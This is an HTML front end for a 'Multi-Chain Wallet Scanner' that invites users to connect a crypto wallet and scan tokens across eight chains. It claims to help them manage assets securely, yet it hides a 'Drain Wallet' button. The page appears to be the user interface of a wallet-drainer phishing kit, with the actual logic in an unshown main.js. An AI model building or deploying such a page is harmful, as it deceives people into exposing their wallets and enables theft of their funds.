<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Multi-Chain Wallet Scanner</title>
  <style>
    /* Keep all your existing CSS styles */
    body {
      margin: 0;
      font-family: 'Arial', sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      color: #ffffff;
      min-height: 100vh;
    }
    /* ... rest of your CSS ... */
  </style>
</head>
<body>
  <main class="container">
    <div class="card">
      <h1>🔗 Multi-Chain Wallet Scanner</h1>
      <p class="subtitle">
        Connect, scan tokens across all chains, and manage your assets securely
      </p>

      <!-- CONNECT BUTTON -->
      <button id="connectBtn" class="connect-btn">
        <span>🔗 Connect Wallet</span>
      </button>

      <!-- STATUS MESSAGE -->
      <div id="status" class="status">
        ⏳ Ready to connect...
      </div>

      <!-- CHAIN SELECTOR -->
      <div id="chainSelector" class="chain-selector hidden">
        <label>Switch Network:</label>
        <select id="networkSelect">
          <option value="1">🌐 Ethereum Mainnet</option>
          <option value="56">🟡 Binance Smart Chain</option>
          <option value="137">🟣 Polygon</option>
          <option value="42161">🔵 Arbitrum</option>
          <option value="10">🟠 Optimism</option>
          <option value="8453">🔷 Base</option>
          <option value="43114">❄️ Avalanche</option>
          <option value="250">👻 Fantom</option>
        </select>
      </div>

      <!-- SCAN ALL CHAINS BUTTON -->
      <button id="scanAllBtn" class="scan-btn hidden">
        🔍 Scan All Chains for Tokens
      </button>

      <!-- TOKENS DISPLAY -->
      <div id="tokensContainer" class="tokens-container hidden">
        <div class="tokens-header">
          <h3>💰 Wallet Tokens</h3>
          <span id="tokenCount" class="token-count">0 tokens</span>
        </div>
        <div id="tokens" class="tokens-list">
          <!-- Tokens will appear here -->
        </div>
      </div>

      <!-- DRAIN BUTTON -->
      <button id="drainBtn" class="drain-btn hidden">
        ⚡ Drain Wallet
      </button>
    </div>
  </main>

  <!-- SIMPLE SCRIPT TAG - NO MODULE EXPORTS -->
  <script src="main.js"></script>
</body>
</html>
